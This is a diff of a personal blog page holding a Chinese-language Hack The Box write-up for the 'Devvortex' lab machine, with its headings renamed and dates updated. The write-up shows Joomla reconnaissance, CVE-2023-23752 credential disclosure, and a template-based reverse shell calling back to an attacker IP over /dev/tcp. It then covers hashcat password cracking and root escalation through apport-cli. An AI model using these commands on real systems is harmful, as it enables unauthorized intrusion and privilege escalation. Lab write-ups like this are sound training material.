@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/1.png">
 <meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/15/Devvortex/2.png">
 <meta property="article:published_time" content="2025-09-15T15:35:23.000Z">
-<meta property="article:modified_time" content="2025-09-16T09:31:55.465Z">
+<meta property="article:modified_time" content="2025-09-18T02:34:44.176Z">
 <meta property="article:author" content="Xu Haoxiang">
 <meta property="article:tag" content="HTB">
 <meta name="twitter:card" content="summary">
@@ -447,7 +447,7 @@
         <p>真是忙里偷闲的日子呀 刷题记录 学到了一个不常见的CMS架构</p>
 <span id="more"></span>
 
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>对于开放的端口而言 并没有太多值得需要关注的地方 又是网站服务80端口起手</p>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>对于开放的端口而言 并没有太多值得需要关注的地方 又是网站服务80端口起手</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p22,80 10.10.11.242</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-15 23:38 +0800</span><br><span class="line">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: DevVortex</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds</span><br></pre></td></tr></table></figure>
 
 <p>进入web服务之后 并不能找到合适的攻击点 下方的输入框也没有什么头绪 下一步还是HTB提供的思路去寻找子域名 也是学到了</p>
@@ -464,7 +464,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search joomla</span><br><span class="line">14  auxiliary/scanner/http/joomla_version</span><br><span class="line">msf &gt; use auxiliary/scanner/http/joomla_version</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; set rhosts http://dev.devvortex.htb/</span><br><span class="line">rhosts =&gt; http://dev.devvortex.htb/</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; run</span><br><span class="line">[*] Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">[+] Joomla version: 4.2.6</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
 
 <p>成功获取该joomla版本为4.2.6</p>
-<h1 id="着手"><a href="#着手" class="headerlink" title="着手"></a>着手</h1><h2 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h2><p>既然知道了框架 那搜一下关于他的洞 发现没有4.2.6的 但是有个比他高一点的4.2.8 那就试一下好啦</p>
+<h1 id="Shell-as-logan"><a href="#Shell-as-logan" class="headerlink" title="Shell as logan"></a>Shell as logan</h1><h2 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h2><p>既然知道了框架 那搜一下关于他的洞 发现没有4.2.6的 但是有个比他高一点的4.2.8 那就试一下好啦</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit joomla | grep 4.2</span><br><span class="line">Joomla! v4.2.8 - Unauthenticated information disclosure             | php/webapps/51334.py</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit -x php/webapps/51334.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env ruby</span><br><span class="line"></span><br><span class="line"># Exploit</span><br><span class="line">## Title: Joomla! v4.2.8 - Unauthenticated information disclosure</span><br><span class="line">## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)</span><br><span class="line">## Author website: https://pwn.by/noraj/</span><br><span class="line">## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752</span><br><span class="line">## Date: 2023-03-24</span><br><span class="line">## Vendor Homepage: https://www.joomla.org/</span><br><span class="line">## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz</span><br><span class="line">## Version: 4.0.0 &lt; 4.2.8 (it means from 4.0.0 up to 4.2.7)</span><br></pre></td></tr></table></figure>
 
 <p>发现确实是4.0.0到4.2.8都可以通用的漏洞 那么就用msfconsole着手吧</p>
@@ -478,7 +478,7 @@
 <p>对index.php我们因为权限并不能修改 但是发现了error.php这个漏网之鱼 修改之后弹个shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dev.devvortex.htb/hack?hack=bash -c &quot;bash -i &gt;%26 /dev/tcp/10.10.16.2/4444 0&gt;%261&quot;</span><br><span class="line"></span><br><span class="line">❯ nc -lvn 4444</span><br><span class="line">bash: cannot set terminal process group (871): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">&lt;tb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$</span><br><span class="line">//连接后使用python升级shell</span><br></pre></td></tr></table></figure>
 
-<h1 id="logan登陆"><a href="#logan登陆" class="headerlink" title="logan登陆"></a>logan登陆</h1><h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>连接之后发现home下只有logan用户 尝试使用之前的lewis&#x2F;P4ntherg0t1n5r3c0n##用户密码无法ssh连接 后来想起来之前的数据库还没有连接过 尝试使用mysql连接数据库</p>
+<h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>连接之后发现home下只有logan用户 尝试使用之前的lewis&#x2F;P4ntherg0t1n5r3c0n##用户密码无法ssh连接 后来想起来之前的数据库还没有连接过 尝试使用mysql连接数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">&lt;htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">...</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
 
 <p>ok成功连接上 就不开远程连接了 直接干terminal好了</p>
@@ -490,29 +490,33 @@
 <p>当然反过来去撞lewis的密码也是可以的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❯ cat sqlpass</span><br><span class="line">P4ntherg0t1n5r3c0n##</span><br><span class="line">❯ hashcat logan  sqlpass --user -m 3200</span><br><span class="line">...</span><br><span class="line">$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u:P4ntherg0t1n5r3c0n##</span><br></pre></td></tr></table></figure>
 
-<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>ok那就用logan:tequieromucho进行ssh登陆 成功拿到user.txt</p>
+<p>ok那就用logan:tequieromucho进行ssh登陆 成功拿到user.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh logan@10.10.11.242</span><br><span class="line">...</span><br><span class="line">logan@devvortex:~$ cat /home/logan/user.txt</span><br><span class="line">7255c0f90e316ba7041e99fa4732413c</span><br></pre></td></tr></table></figure>
 
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用sudo -l之后发现可以用SUID提权 发现可以利用CVE-2023-1326</p>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>使用sudo -l之后发现可以用SUID提权 发现可以利用CVE-2023-1326</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:~$ sudo -l</span><br><span class="line">[sudo] password for logan:</span><br><span class="line">Matching Defaults entries for logan on devvortex:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User logan may run the following commands on devvortex:</span><br><span class="line">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure>
 
 <p>apport为处理崩溃程序 若还没崩溃文件那可以先制造一个</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex:/var/crash$ sleep 20 &amp;</span><br><span class="line">[1] 2761</span><br><span class="line">logan@devvortex:/var/crash$ kill -ABRT 2761</span><br><span class="line">logan@devvortex:/var/crash$ ls</span><br><span class="line">_usr_bin_sleep.1000.crash</span><br><span class="line">[1]+  Aborted                 (core dumped) sleep 20</span><br></pre></td></tr></table></figure>
 
 <p>获得到崩溃文件之后 就可以进行SUID啦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex: sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash</span><br><span class="line">press V (view report)</span><br><span class="line">!/bin/bash(直接输入 不用管屏幕显示的什么)</span><br><span class="line"></span><br><span class="line">root@devvortex:/var/crash# cd /root</span><br><span class="line">root@devvortex:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@devvortex:~# cat root.txt</span><br><span class="line">7acd9379429470e54caf82726290e8ff</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logan@devvortex: sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash</span><br><span class="line">press V (view report)</span><br><span class="line">!/bin/bash(直接输入 不用管屏幕显示的什么)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
     </article>
     <!-- license -->
         <div class="license-wrapper">
             <p>Author：<a href="http://dawoxiansigema.github.io">Xu Haoxiang</a>
             <p>Link：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">http://dawoxiansigema.github.io/2025/09/15/Devvortex/</a>
             <p>Publish date：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">September 15th 2025, 11:35:23 pm</a>
-            <p>Update date：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">September 16th 2025, 5:31:55 pm</a>
+            <p>Update date：<a href="http://dawoxiansigema.github.io/2025/09/15/Devvortex/">September 18th 2025, 10:34:44 am</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/09/17/Paper/" title="Paper">
+                    <div class="nextTitle">Paper</div>
+                </a>
         </li>
         <li class="previous">
                 <div class="prevSlogan">Previous Post</div>
@@ -569,7 +573,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9D%80%E6%89%8B"><span class="toc-number">2.</span> <span class="toc-text">着手</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-23752"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2023-23752</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Templates%E4%BF%AE%E6%94%B9"><span class="toc-number">2.2.</span> <span class="toc-text">Templates修改</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#logan%E7%99%BB%E9%99%86"><span class="toc-number">3.</span> <span class="toc-text">logan登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat"><span class="toc-number">3.1.</span> <span class="toc-text">Hashcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH"><span class="toc-number">3.2.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-logan"><span class="toc-number">2.</span> <span class="toc-text">Shell as logan</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-23752"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2023-23752</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Templates%E4%BF%AE%E6%94%B9"><span class="toc-number">2.2.</span> <span class="toc-text">Templates修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat"><span class="toc-number">2.3.</span> <span class="toc-text">Hashcat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-root"><span class="toc-number">3.</span> <span class="toc-text">Shell as root</span></a></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -585,15 +589,20 @@
         
         
         
+        
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 4
+        Total : 5
         </div>
         <!-- search  -->
     </div>
     <div class="post-archive">
             <div class="archive-year"> 2025 </div>
             <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span>
+            <a class="archive-post-title" href="/2025/09/17/Paper/">Paper</a>
+        </li>
         <li class="archive-post-item">
             <span class="archive-post-date">09/15</span>
             <a class="archive-post-title" href="/2025/09/15/Devvortex/">Devvortex</a>
